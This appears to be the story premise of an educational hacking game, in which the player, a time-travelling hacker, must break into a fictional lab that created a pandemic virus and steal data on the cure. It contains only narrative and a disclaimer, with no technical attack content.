The deadly ABCD-20 virus, which was artificially developed in a secret Sauronian laboratory, wiped out roughly 70% of the world population, including the leaders of all the other world superpowers. After the pandemic, nothing was stopping Sauronia from conquering every single nation that dared to stand in its way.\n\nA group of genius scientists from all around the world created a multinational rebel alliance and secretly developed a time machine. You, as their best hacker, willing to sacrifice your life for a brighter future, agreed to use the time machine to travel back in time to the year 2020. Your mission: hack into the secret laboratory and steal the information about the cure. Send it to contemporary scientists so that they may use the cure to prevent the pandemic.\n\n## Disclaimer\n\nThis game is for educational purposes only.
